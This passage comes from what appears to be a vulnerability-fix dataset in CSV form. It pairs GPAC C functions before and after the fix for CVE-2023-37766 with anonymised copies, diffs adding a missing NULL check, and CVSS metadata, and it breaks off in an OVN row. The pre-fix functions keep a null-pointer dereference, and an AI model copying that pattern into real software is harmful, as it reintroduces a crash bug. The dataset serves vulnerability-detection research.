GF_UserDataBox *VAR_7;
GF_UserDataMap *VAR_8;
if (!VAR_1 || !VAR_1->moov || !VAR_3) return VAR_9;
if (VAR_2) {
VAR_6 = gf_isom_get_track_from_file(VAR_1, VAR_2);
if (!VAR_6) return VAR_10;
VAR_7 = VAR_6->udta;
} else {
VAR_7 = VAR_1->moov->udta;
}
if (!VAR_7) return VAR_9;
if (VAR_3>gf_list_count(VAR_7->recordList)) return VAR_9;
VAR_8 = (GF_UserDataMap*)gf_list_get(VAR_7->recordList, VAR_3 - 1);
if (VAR_4) *VAR_4 = VAR_8->boxType;
if (VAR_5) memcpy(*VAR_5, VAR_8->uuid, 16);
return VAR_10;
}",,"GF_EXPORT
GF_Err gf_isom_get_udta_type(GF_ISOFile *movie, u32 trackNumber, u32 udta_idx, u32 *UserDataType, bin128 *UUID)
{
	GF_TrackBox *trak;
	GF_UserDataBox *udta;
	GF_UserDataMap *map;
	if (!movie || !movie->moov || !udta_idx) return GF_BAD_PARAM;

	if (trackNumber) {
		trak = gf_isom_get_track_from_file(movie, trackNumber);
		if (!trak) return GF_OK;
		udta = trak->udta;
	} else {
		if (!movie->moov) return GF_BAD_PARAM;
		udta = movie->moov->udta;
	}
	if (!udta) return GF_BAD_PARAM;
	if (udta_idx>gf_list_count(udta->recordList)) return GF_BAD_PARAM;
	map = (GF_UserDataMap*)gf_list_get(udta->recordList, udta_idx - 1);
	if (UserDataType) *UserDataType = map->boxType;
	if (UUID) memcpy(*UUID, map->uuid, 16);
	return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_get_udta_type(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, u32 *VAR_4, bin128 *VAR_5)
{
	GF_TrackBox *VAR_6;
	GF_UserDataBox *VAR_7;
	GF_UserDataMap *VAR_8;
	if (!VAR_1 || !VAR_1->moov || !VAR_3) return VAR_9;

	if (VAR_2) {
		VAR_6 = gf_isom_get_track_from_file(VAR_1, VAR_2);
		if (!VAR_6) return VAR_10;
		VAR_7 = VAR_6->udta;
	} else {
		if (!VAR_1->moov) return VAR_9;
		VAR_7 = VAR_1->moov->udta;
	}
	if (!VAR_7) return VAR_9;
	if (VAR_3>gf_list_count(VAR_7->recordList)) return VAR_9;
	VAR_8 = (GF_UserDataMap*)gf_list_get(VAR_7->recordList, VAR_3 - 1);
	if (VAR_4) *VAR_4 = VAR_8->boxType;
	if (VAR_5) memcpy(*VAR_5, VAR_8->uuid, 16);
	return VAR_10;
}",,"--- func_before
+++ func_after
@@ -11,6 +11,7 @@
 		if (!trak) return GF_OK;
 		udta = trak->udta;
 	} else {
+		if (!movie->moov) return GF_BAD_PARAM;
 		udta = movie->moov->udta;
 	}
 	if (!udta) return GF_BAD_PARAM;","{'deleted_lines': [], 'added_lines': ['\t\tif (!movie->moov) return GF_BAD_PARAM;']}",True,GPAC v2.3-DEV-rev381-g817a848f6-master was discovered to contain a segmentation violation in the gf_isom_remove_user_data function at /lib/libgpac.so.,5.5,MEDIUM,1,valid,2023-07-04T15:06:20Z,4
CVE-2023-37766,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fixed #2516,a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,https://github.com/gpac/gpac/commit/a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,src/isomedia/isom_read.c,gf_isom_get_udta_count,"GF_EXPORT
u32 gf_isom_get_udta_count(GF_ISOFile *movie, u32 trackNumber)
{
GF_TrackBox *trak;
GF_UserDataBox *udta;
if (!movie || !movie->moov) return 0;
if (trackNumber) {
trak = gf_isom_get_track_from_file(movie, trackNumber);
if (!trak) return 0;
udta = trak->udta;
} else {
udta = movie->moov->udta;
}
if (udta) return gf_list_count(udta->recordList);
return 0;
}","GF_EXPORT
VAR_0 gf_isom_get_udta_count(GF_ISOFile *VAR_1, u32 VAR_2)
{
GF_TrackBox *VAR_3;
GF_UserDataBox *VAR_4;
if (!VAR_1 || !VAR_1->moov) return 0;
if (VAR_2) {
VAR_3 = gf_isom_get_track_from_file(VAR_1, VAR_2);
if (!VAR_3) return 0;
VAR_4 = VAR_3->udta;
} else {
VAR_4 = VAR_1->moov->udta;
}
if (VAR_4) return gf_list_count(VAR_4->recordList);
return 0;
}",,"GF_EXPORT
u32 gf_isom_get_udta_count(GF_ISOFile *movie, u32 trackNumber)
{
	GF_TrackBox *trak;
	GF_UserDataBox *udta;
	if (!movie || !movie->moov) return 0;

	if (trackNumber) {
		trak = gf_isom_get_track_from_file(movie, trackNumber);
		if (!trak) return 0;
		udta = trak->udta;
	} else {
		if (!movie->moov) return 0;
		udta = movie->moov->udta;
	}
	if (udta) return gf_list_count(udta->recordList);
	return 0;
}","GF_EXPORT
VAR_0 gf_isom_get_udta_count(GF_ISOFile *VAR_1, u32 VAR_2)
{
	GF_TrackBox *VAR_3;
	GF_UserDataBox *VAR_4;
	if (!VAR_1 || !VAR_1->moov) return 0;

	if (VAR_2) {
		VAR_3 = gf_isom_get_track_from_file(VAR_1, VAR_2);
		if (!VAR_3) return 0;
		VAR_4 = VAR_3->udta;
	} else {
		if (!VAR_1->moov) return 0;
		VAR_4 = VAR_1->moov->udta;
	}
	if (VAR_4) return gf_list_count(VAR_4->recordList);
	return 0;
}",,"--- func_before
+++ func_after
@@ -10,6 +10,7 @@
 		if (!trak) return 0;
 		udta = trak->udta;
 	} else {
+		if (!movie->moov) return 0;
 		udta = movie->moov->udta;
 	}
 	if (udta) return gf_list_count(udta->recordList);","{'deleted_lines': [], 'added_lines': ['\t\tif (!movie->moov) return 0;']}",True,GPAC v2.3-DEV-rev381-g817a848f6-master was discovered to contain a segmentation violation in the gf_isom_remove_user_data function at /lib/libgpac.so.,5.5,MEDIUM,1,valid,2023-07-04T15:06:20Z,4
CVE-2023-37766,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fixed #2516,a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,https://github.com/gpac/gpac/commit/a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,src/isomedia/isom_write.c,gf_isom_remove_user_data,"GF_EXPORT
GF_Err gf_isom_remove_user_data(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID)
{
GF_UserDataMap *map;
u32 i;
GF_Err e;
bin128 t;
GF_TrackBox *trak;
GF_UserDataBox *udta;
e = CanAccessMovie(movie, GF_ISOM_OPEN_WRITE);
if (e) return e;
if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;
memset(t, 1, 16);
if (trackNumber) {
trak = gf_isom_get_track_from_file(movie, trackNumber);
if (!trak) return GF_EOS;
udta = trak->udta;
} else {
udta = movie->moov->udta;
}
if (!udta) return GF_EOS;
i=0;
while ((map = (GF_UserDataMap*)gf_list_enum(udta->recordList, &i))) {
if ((map->boxType == GF_ISOM_BOX_TYPE_UUID)  && !memcmp(map->uuid, UUID, 16)) goto found;
else if (map->boxType == UserDataType) goto found;
}
return GF_OK;
found:
gf_list_rem(udta->recordList, i-1);
gf_isom_box_array_del(map->boxes);
gf_free(map);
return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_remove_user_data(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4)
{
GF_UserDataMap *VAR_5;
u32 VAR_6;
GF_Err VAR_7;
bin128 VAR_8;
GF_TrackBox *VAR_9;
GF_UserDataBox *VAR_10;
VAR_7 = CanAccessMovie(VAR_1, VAR_11);
if (VAR_7) return VAR_7;
if (VAR_3 == VAR_12) VAR_3 = 0;
memset(VAR_8, 1, 16);
if (VAR_2) {
VAR_9 = gf_isom_get_track_from_file(VAR_1, VAR_2);
if (!VAR_9) return VAR_13;
VAR_10 = VAR_9->udta;
} else {
VAR_10 = VAR_1->moov->udta;
}
if (!VAR_10) return VAR_13;
VAR_6=0;
while ((VAR_5 = (GF_UserDataMap*)gf_list_enum(VAR_10->recordList, &VAR_6))) {
if ((VAR_5->boxType == VAR_12)  && !memcmp(VAR_5->uuid, VAR_4, 16)) goto found;
else if (VAR_5->boxType == VAR_3) goto found;
}
return VAR_14;
found:
gf_list_rem(VAR_10->recordList, VAR_6-1);
gf_isom_box_array_del(VAR_5->boxes);
gf_free(VAR_5);
return VAR_14;
}",,"GF_EXPORT
GF_Err gf_isom_remove_user_data(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID)
{
	GF_UserDataMap *map;
	u32 i;
	GF_Err e;
	bin128 t;
	GF_TrackBox *trak;
	GF_UserDataBox *udta;

	e = CanAccessMovie(movie, GF_ISOM_OPEN_WRITE);
	if (e) return e;

	if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;
	memset(t, 1, 16);

	if (trackNumber) {
		trak = gf_isom_get_track_from_file(movie, trackNumber);
		if (!trak) return GF_EOS;
		udta = trak->udta;
	} else {
		if (!movie->moov) return GF_BAD_PARAM;
		udta = movie->moov->udta;
	}
	//do not return any error if no udta
	if (!udta) return GF_EOS;

	i=0;
	while ((map = (GF_UserDataMap*)gf_list_enum(udta->recordList, &i))) {
		if ((map->boxType == GF_ISOM_BOX_TYPE_UUID)  && !memcmp(map->uuid, UUID, 16)) goto found;
		else if (map->boxType == UserDataType) goto found;
	}
	//not found
	return GF_OK;

found:

	gf_list_rem(udta->recordList, i-1);
	gf_isom_box_array_del(map->boxes);
	gf_free(map);

	//but we keep the UDTA no matter what
	return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_remove_user_data(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4)
{
	GF_UserDataMap *VAR_5;
	u32 VAR_6;
	GF_Err VAR_7;
	bin128 VAR_8;
	GF_TrackBox *VAR_9;
	GF_UserDataBox *VAR_10;

	VAR_7 = CanAccessMovie(VAR_1, VAR_11);
	if (VAR_7) return VAR_7;

	if (VAR_3 == VAR_12) VAR_3 = 0;
	memset(VAR_8, 1, 16);

	if (VAR_2) {
		VAR_9 = gf_isom_get_track_from_file(VAR_1, VAR_2);
		if (!VAR_9) return VAR_13;
		VAR_10 = VAR_9->udta;
	} else {
		if (!VAR_1->moov) return VAR_14;
		VAR_10 = VAR_1->moov->udta;
	}
	/* COMMENT_0 */
	if (!VAR_10) return VAR_13;

	VAR_6=0;
	while ((VAR_5 = (GF_UserDataMap*)gf_list_enum(VAR_10->recordList, &VAR_6))) {
		if ((VAR_5->boxType == VAR_12)  && !memcmp(VAR_5->uuid, VAR_4, 16)) goto found;
		else if (VAR_5->boxType == VAR_3) goto found;
	}
	/* COMMENT_1 */
	return VAR_15;

found:

	gf_list_rem(VAR_10->recordList, VAR_6-1);
	gf_isom_box_array_del(VAR_5->boxes);
	gf_free(VAR_5);

	/* COMMENT_2 */
	return VAR_15;
}",,"--- func_before
+++ func_after
@@ -19,6 +19,7 @@
 		if (!trak) return GF_EOS;
 		udta = trak->udta;
 	} else {
+		if (!movie->moov) return GF_BAD_PARAM;
 		udta = movie->moov->udta;
 	}
 	//do not return any error if no udta","{'deleted_lines': [], 'added_lines': ['\t\tif (!movie->moov) return GF_BAD_PARAM;']}",True,GPAC v2.3-DEV-rev381-g817a848f6-master was discovered to contain a segmentation violation in the gf_isom_remove_user_data function at /lib/libgpac.so.,5.5,MEDIUM,1,valid,2023-07-04T15:06:20Z,4
CVE-2023-37766,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fixed #2516,a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,https://github.com/gpac/gpac/commit/a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,src/isomedia/isom_write.c,gf_isom_add_user_data,"GF_EXPORT
GF_Err gf_isom_add_user_data(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID, u8 *data, u32 DataLength)
{
GF_Err e;
GF_TrackBox *trak;
GF_UserDataBox *udta;
e = CanAccessMovie(movie, GF_ISOM_OPEN_WRITE);
if (e) return e;
if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;
if (trackNumber) {
trak = gf_isom_get_track_from_file(movie, trackNumber);
if (!trak) return GF_BAD_PARAM;
if (!trak->udta) trak_on_child_box((GF_Box*)trak, gf_isom_box_new_parent(&trak->child_boxes, GF_ISOM_BOX_TYPE_UDTA), GF_FALSE);
udta = trak->udta;
} else {
if (!movie->moov->udta) moov_on_child_box((GF_Box*)movie->moov, gf_isom_box_new_parent(&movie->moov->child_boxes, GF_ISOM_BOX_TYPE_UDTA), GF_FALSE);
udta = movie->moov->udta;
}
if (!udta) return GF_OUT_OF_MEM;
if (UserDataType) {
GF_UnknownBox *a = (GF_UnknownBox *) gf_isom_box_new(GF_ISOM_BOX_TYPE_UNKNOWN);
if (!a) return GF_OUT_OF_MEM;
a->original_4cc = UserDataType;
if (DataLength) {
a->data = (char*)gf_malloc(sizeof(char)*DataLength);
if (!a->data) return GF_OUT_OF_MEM;
memcpy(a->data, data, DataLength);
a->dataSize = DataLength;
}
return udta_on_child_box((GF_Box *)udta, (GF_Box *) a, GF_FALSE);
} else if (UUID) {
GF_UnknownUUIDBox *a = (GF_UnknownUUIDBox *) gf_isom_box_new(GF_ISOM_BOX_TYPE_UUID);
if (!a) return GF_OUT_OF_MEM;
memcpy(a->uuid, UUID, 16);
if (DataLength) {
a->data = (char*)gf_malloc(sizeof(char)*DataLength);
if (!a->data) return GF_OUT_OF_MEM;
memcpy(a->data, data, DataLength);
a->dataSize = DataLength;
}
return udta_on_child_box((GF_Box *)udta, (GF_Box *) a, GF_FALSE);
} else {
return GF_BAD_PARAM;
}
return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_add_user_data(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4, u8 *VAR_5, u32 VAR_6)
{
GF_Err VAR_7;
GF_TrackBox *VAR_8;
GF_UserDataBox *VAR_9;
VAR_7 = CanAccessMovie(VAR_1, VAR_10);
if (VAR_7) return VAR_7;
if (VAR_3 == VAR_11) VAR_3 = 0;
if (VAR_2) {
VAR_8 = gf_isom_get_track_from_file(VAR_1, VAR_2);
if (!VAR_8) return VAR_12;
if (!VAR_8->udta) trak_on_child_box((GF_Box*)VAR_8, gf_isom_box_new_parent(&VAR_8->child_boxes, VAR_13), VAR_14);
VAR_9 = VAR_8->udta;
} else {
if (!VAR_1->moov->udta) moov_on_child_box((GF_Box*)VAR_1->moov, gf_isom_box_new_parent(&VAR_1->moov->child_boxes, VAR_13), VAR_14);
VAR_9 = VAR_1->moov->udta;
}
if (!VAR_9) return VAR_15;
if (VAR_3) {
GF_UnknownBox *VAR_16 = (GF_UnknownBox *) gf_isom_box_new(VAR_17);
if (!VAR_16) return VAR_15;
VAR_16->original_4cc = VAR_3;
if (VAR_6) {
VAR_16->data = (char*)gf_malloc(sizeof(char)*VAR_6);
if (!VAR_16->data) return VAR_15;
memcpy(VAR_16->data, VAR_5, VAR_6);
VAR_16->dataSize = VAR_6;
}
return udta_on_child_box((GF_Box *)VAR_9, (GF_Box *) VAR_16, VAR_14);
} else if (VAR_4) {
GF_UnknownUUIDBox *VAR_16 = (GF_UnknownUUIDBox *) gf_isom_box_new(VAR_11);
if (!VAR_16) return VAR_15;
memcpy(VAR_16->uuid, VAR_4, 16);
if (VAR_6) {
VAR_16->data = (char*)gf_malloc(sizeof(char)*VAR_6);
if (!VAR_16->data) return VAR_15;
memcpy(VAR_16->data, VAR_5, VAR_6);
VAR_16->dataSize = VAR_6;
}
return udta_on_child_box((GF_Box *)VAR_9, (GF_Box *) VAR_16, VAR_14);
} else {
return VAR_12;
}
return VAR_18;
}",,"GF_EXPORT
GF_Err gf_isom_add_user_data(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID, u8 *data, u32 DataLength)
{
	GF_Err e;
	GF_TrackBox *trak;
	GF_UserDataBox *udta;

	e = CanAccessMovie(movie, GF_ISOM_OPEN_WRITE);
	if (e) return e;

	if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;

	if (trackNumber) {
		trak = gf_isom_get_track_from_file(movie, trackNumber);
		if (!trak) return GF_BAD_PARAM;
		if (!trak->udta) trak_on_child_box((GF_Box*)trak, gf_isom_box_new_parent(&trak->child_boxes, GF_ISOM_BOX_TYPE_UDTA), GF_FALSE);
		udta = trak->udta;
	} else {
		if (!movie->moov) return GF_BAD_PARAM;
		if (!movie->moov->udta) moov_on_child_box((GF_Box*)movie->moov, gf_isom_box_new_parent(&movie->moov->child_boxes, GF_ISOM_BOX_TYPE_UDTA), GF_FALSE);
		udta = movie->moov->udta;
	}
	if (!udta) return GF_OUT_OF_MEM;

	//create a default box
	if (UserDataType) {
		GF_UnknownBox *a = (GF_UnknownBox *) gf_isom_box_new(GF_ISOM_BOX_TYPE_UNKNOWN);
		if (!a) return GF_OUT_OF_MEM;
		a->original_4cc = UserDataType;
		if (DataLength) {
			a->data = (char*)gf_malloc(sizeof(char)*DataLength);
			if (!a->data) return GF_OUT_OF_MEM;
			memcpy(a->data, data, DataLength);
			a->dataSize = DataLength;
		}
		return udta_on_child_box((GF_Box *)udta, (GF_Box *) a, GF_FALSE);
	} else if (UUID) {
		GF_UnknownUUIDBox *a = (GF_UnknownUUIDBox *) gf_isom_box_new(GF_ISOM_BOX_TYPE_UUID);
		if (!a) return GF_OUT_OF_MEM;
		memcpy(a->uuid, UUID, 16);
		if (DataLength) {
			a->data = (char*)gf_malloc(sizeof(char)*DataLength);
			if (!a->data) return GF_OUT_OF_MEM;
			memcpy(a->data, data, DataLength);
			a->dataSize = DataLength;
		}
		return udta_on_child_box((GF_Box *)udta, (GF_Box *) a, GF_FALSE);
	} else {
		return GF_BAD_PARAM;
	}
	return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_add_user_data(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4, u8 *VAR_5, u32 VAR_6)
{
	GF_Err VAR_7;
	GF_TrackBox *VAR_8;
	GF_UserDataBox *VAR_9;

	VAR_7 = CanAccessMovie(VAR_1, VAR_10);
	if (VAR_7) return VAR_7;

	if (VAR_3 == VAR_11) VAR_3 = 0;

	if (VAR_2) {
		VAR_8 = gf_isom_get_track_from_file(VAR_1, VAR_2);
		if (!VAR_8) return VAR_12;
		if (!VAR_8->udta) trak_on_child_box((GF_Box*)VAR_8, gf_isom_box_new_parent(&VAR_8->child_boxes, VAR_13), VAR_14);
		VAR_9 = VAR_8->udta;
	} else {
		if (!VAR_1->moov) return VAR_12;
		if (!VAR_1->moov->udta) moov_on_child_box((GF_Box*)VAR_1->moov, gf_isom_box_new_parent(&VAR_1->moov->child_boxes, VAR_13), VAR_14);
		VAR_9 = VAR_1->moov->udta;
	}
	if (!VAR_9) return VAR_15;

	/* COMMENT_0 */
	if (VAR_3) {
		GF_UnknownBox *VAR_16 = (GF_UnknownBox *) gf_isom_box_new(VAR_17);
		if (!VAR_16) return VAR_15;
		VAR_16->original_4cc = VAR_3;
		if (VAR_6) {
			VAR_16->data = (char*)gf_malloc(sizeof(char)*VAR_6);
			if (!VAR_16->data) return VAR_15;
			memcpy(VAR_16->data, VAR_5, VAR_6);
			VAR_16->dataSize = VAR_6;
		}
		return udta_on_child_box((GF_Box *)VAR_9, (GF_Box *) VAR_16, VAR_14);
	} else if (VAR_4) {
		GF_UnknownUUIDBox *VAR_16 = (GF_UnknownUUIDBox *) gf_isom_box_new(VAR_11);
		if (!VAR_16) return VAR_15;
		memcpy(VAR_16->uuid, VAR_4, 16);
		if (VAR_6) {
			VAR_16->data = (char*)gf_malloc(sizeof(char)*VAR_6);
			if (!VAR_16->data) return VAR_15;
			memcpy(VAR_16->data, VAR_5, VAR_6);
			VAR_16->dataSize = VAR_6;
		}
		return udta_on_child_box((GF_Box *)VAR_9, (GF_Box *) VAR_16, VAR_14);
	} else {
		return VAR_12;
	}
	return VAR_18;
}",,"--- func_before
+++ func_after
@@ -16,6 +16,7 @@
 		if (!trak->udta) trak_on_child_box((GF_Box*)trak, gf_isom_box_new_parent(&trak->child_boxes, GF_ISOM_BOX_TYPE_UDTA), GF_FALSE);
 		udta = trak->udta;
 	} else {
+		if (!movie->moov) return GF_BAD_PARAM;
 		if (!movie->moov->udta) moov_on_child_box((GF_Box*)movie->moov, gf_isom_box_new_parent(&movie->moov->child_boxes, GF_ISOM_BOX_TYPE_UDTA), GF_FALSE);
 		udta = movie->moov->udta;
 	}","{'deleted_lines': [], 'added_lines': ['\t\tif (!movie->moov) return GF_BAD_PARAM;']}",True,GPAC v2.3-DEV-rev381-g817a848f6-master was discovered to contain a segmentation violation in the gf_isom_remove_user_data function at /lib/libgpac.so.,5.5,MEDIUM,1,valid,2023-07-04T15:06:20Z,4
CVE-2023-37766,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,fixed #2516,a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,https://github.com/gpac/gpac/commit/a64c60ef0983be6db8ab1e4a663e0ce83ff7bf2c,src/isomedia/isom_write.c,gf_isom_remove_user_data_item,"GF_EXPORT
GF_Err gf_isom_remove_user_data_item(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID, u32 UserDataIndex)
{
GF_UserDataMap *map;
GF_Box *a;
u32 i;
bin128 t;
GF_Err e;
GF_TrackBox *trak;
GF_UserDataBox *udta;
e = CanAccessMovie(movie, GF_ISOM_OPEN_WRITE);
if (e) return e;
if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;
memset(t, 1, 16);
if (trackNumber) {
trak = gf_isom_get_track_from_file(movie, trackNumber);
if (!trak) return GF_BAD_PARAM;
udta = trak->udta;
} else {
udta = movie->moov->udta;
}
if (!udta) return GF_BAD_PARAM;
if (!UserDataIndex) return GF_BAD_PARAM;
i=0;
while ((map = (GF_UserDataMap*)gf_list_enum(udta->recordList, &i))) {
if ((map->boxType == GF_ISOM_BOX_TYPE_UUID)  && !memcmp(map->uuid, UUID, 16)) goto found;
else if (map->boxType == UserDataType) goto found;
}
return GF_OK;
found:
if (UserDataIndex > gf_list_count(map->boxes) ) return GF_BAD_PARAM;
a = (GF_Box*)gf_list_get(map->boxes, UserDataIndex-1);
gf_isom_box_del_parent(&map->boxes, a);
if (!gf_list_count(map->boxes)) {
gf_list_rem(udta->recordList, i-1);
gf_isom_box_array_del(map->boxes);
gf_free(map);
}
return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_remove_user_data_item(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4, u32 VAR_5)
{
GF_UserDataMap *VAR_6;
GF_Box *VAR_7;
u32 VAR_8;
bin128 VAR_9;
GF_Err VAR_10;
GF_TrackBox *VAR_11;
GF_UserDataBox *VAR_12;
VAR_10 = CanAccessMovie(VAR_1, VAR_13);
if (VAR_10) return VAR_10;
if (VAR_3 == VAR_14) VAR_3 = 0;
memset(VAR_9, 1, 16);
if (VAR_2) {
VAR_11 = gf_isom_get_track_from_file(VAR_1, VAR_2);
if (!VAR_11) return VAR_15;
VAR_12 = VAR_11->udta;
} else {
VAR_12 = VAR_1->moov->udta;
}
if (!VAR_12) return VAR_15;
if (!VAR_5) return VAR_15;
VAR_8=0;
while ((VAR_6 = (GF_UserDataMap*)gf_list_enum(VAR_12->recordList, &VAR_8))) {
if ((VAR_6->boxType == VAR_14)  && !memcmp(VAR_6->uuid, VAR_4, 16)) goto found;
else if (VAR_6->boxType == VAR_3) goto found;
}
return VAR_16;
found:
if (VAR_5 > gf_list_count(VAR_6->boxes) ) return VAR_15;
VAR_7 = (GF_Box*)gf_list_get(VAR_6->boxes, VAR_5-1);
gf_isom_box_del_parent(&VAR_6->boxes, VAR_7);
if (!gf_list_count(VAR_6->boxes)) {
gf_list_rem(VAR_12->recordList, VAR_8-1);
gf_isom_box_array_del(VAR_6->boxes);
gf_free(VAR_6);
}
return VAR_16;
}",,"GF_EXPORT
GF_Err gf_isom_remove_user_data_item(GF_ISOFile *movie, u32 trackNumber, u32 UserDataType, bin128 UUID, u32 UserDataIndex)
{
	GF_UserDataMap *map;
	GF_Box *a;
	u32 i;
	bin128 t;
	GF_Err e;
	GF_TrackBox *trak;
	GF_UserDataBox *udta;

	e = CanAccessMovie(movie, GF_ISOM_OPEN_WRITE);
	if (e) return e;

	if (UserDataType == GF_ISOM_BOX_TYPE_UUID) UserDataType = 0;
	memset(t, 1, 16);

	if (trackNumber) {
		trak = gf_isom_get_track_from_file(movie, trackNumber);
		if (!trak) return GF_BAD_PARAM;
		udta = trak->udta;
	} else {
		if (!movie->moov) return GF_BAD_PARAM;
		udta = movie->moov->udta;
	}
	if (!udta) return GF_BAD_PARAM;
	if (!UserDataIndex) return GF_BAD_PARAM;

	i=0;
	while ((map = (GF_UserDataMap*)gf_list_enum(udta->recordList, &i))) {
		if ((map->boxType == GF_ISOM_BOX_TYPE_UUID)  && !memcmp(map->uuid, UUID, 16)) goto found;
		else if (map->boxType == UserDataType) goto found;
	}
	//not found
	return GF_OK;

found:

	if (UserDataIndex > gf_list_count(map->boxes) ) return GF_BAD_PARAM;
	//delete the box
	a = (GF_Box*)gf_list_get(map->boxes, UserDataIndex-1);
	gf_isom_box_del_parent(&map->boxes, a);

	//remove the map if empty
	if (!gf_list_count(map->boxes)) {
		gf_list_rem(udta->recordList, i-1);
		gf_isom_box_array_del(map->boxes);
		gf_free(map);
	}
	//but we keep the UDTA no matter what
	return GF_OK;
}","GF_EXPORT
VAR_0 gf_isom_remove_user_data_item(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, bin128 VAR_4, u32 VAR_5)
{
	GF_UserDataMap *VAR_6;
	GF_Box *VAR_7;
	u32 VAR_8;
	bin128 VAR_9;
	GF_Err VAR_10;
	GF_TrackBox *VAR_11;
	GF_UserDataBox *VAR_12;

	VAR_10 = CanAccessMovie(VAR_1, VAR_13);
	if (VAR_10) return VAR_10;

	if (VAR_3 == VAR_14) VAR_3 = 0;
	memset(VAR_9, 1, 16);

	if (VAR_2) {
		VAR_11 = gf_isom_get_track_from_file(VAR_1, VAR_2);
		if (!VAR_11) return VAR_15;
		VAR_12 = VAR_11->udta;
	} else {
		if (!VAR_1->moov) return VAR_15;
		VAR_12 = VAR_1->moov->udta;
	}
	if (!VAR_12) return VAR_15;
	if (!VAR_5) return VAR_15;

	VAR_8=0;
	while ((VAR_6 = (GF_UserDataMap*)gf_list_enum(VAR_12->recordList, &VAR_8))) {
		if ((VAR_6->boxType == VAR_14)  && !memcmp(VAR_6->uuid, VAR_4, 16)) goto found;
		else if (VAR_6->boxType == VAR_3) goto found;
	}
	/* COMMENT_0 */
	return VAR_16;

found:

	if (VAR_5 > gf_list_count(VAR_6->boxes) ) return VAR_15;
	/* COMMENT_1 */
	VAR_7 = (GF_Box*)gf_list_get(VAR_6->boxes, VAR_5-1);
	gf_isom_box_del_parent(&VAR_6->boxes, VAR_7);

	/* COMMENT_2 */
	if (!gf_list_count(VAR_6->boxes)) {
		gf_list_rem(VAR_12->recordList, VAR_8-1);
		gf_isom_box_array_del(VAR_6->boxes);
		gf_free(VAR_6);
	}
	/* COMMENT_3 */
	return VAR_16;
}",,"--- func_before
+++ func_after
@@ -20,6 +20,7 @@
 		if (!trak) return GF_BAD_PARAM;
 		udta = trak->udta;
 	} else {
+		if (!movie->moov) return GF_BAD_PARAM;
 		udta = movie->moov->udta;
 	}
 	if (!udta) return GF_BAD_PARAM;","{'deleted_lines': [], 'added_lines': ['\t\tif (!movie->moov) return GF_BAD_PARAM;']}",True,GPAC v2.3-DEV-rev381-g817a848f6-master was discovered to contain a segmentation violation in the gf_isom_remove_user_data function at /lib/libgpac.so.,5.5,MEDIUM,1,valid,2023-07-04T15:06:20Z,4
CVE-2023-3153,['CWE-770'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L,1,ovn-org/ovn,"northd, controller: Add CoPP for SVC monitor

The SVC monitor was exposed without any limitation.
Add CoPP for the SVC monitor flow, which adds a way
for CMSs to limit the traffic that this flow accepts.

Signed-off-by: Ales Musil <amusil@redhat.com>",9a3f7ed905e525ebdcb14541e775211cbb0203bd,https://github.com/ovn-org/ovn/commit/9a3f7ed905e525ebdcb14541e775211cbb0203bd,northd/northd.c,build_lswitch_destination_lookup_bmcast,"static void
build_lswitch_destination_lookup_bmcast(struct ovn_datapath *od,
struct hmap *lflows,
struct ds *actions,
const struct shash *meter_groups)
{
if (od->nbs) {
ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 110,
""eth.dst == $svc_monitor_mac && (tcp || icmp || icmp6)"",
""handle_svc_check(inport);"");
struct mcast_switch_info *mcast_sw_info = &od->mcast_info.sw;
if (mcast_sw_info->enabled) {
ds_clear(actions);
ds_put_cstr(actions, ""igmp;"");
ovn_lflow_metered(lflows, od, S_SWITCH_IN_L2_LKUP, 100,
""igmp"", ds_cstr(actions),
copp_meter_get(COPP_IGMP, od->nbs->copp,
meter_groups));
ovn_lflow_metered(lflows, od, S_SWITCH_IN_L2_LKUP, 100,
""mldv1 || mldv2"", ds_cstr(actions),
copp_meter_get(COPP_IGMP, od->nbs->copp,
meter_groups));
ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 85,
""ip4.mcast && ip4.dst == 224.0.0.0/24"",
""outport = \""""MC_FLOOD_L2""\""; output;"");
ovn_lflow_add(lflows, od, S_SWITCH_IN_L2_LKUP, 85,
""ip6.mcast_flood"",
""outport = \""""MC_FLOOD""\""; output;"");
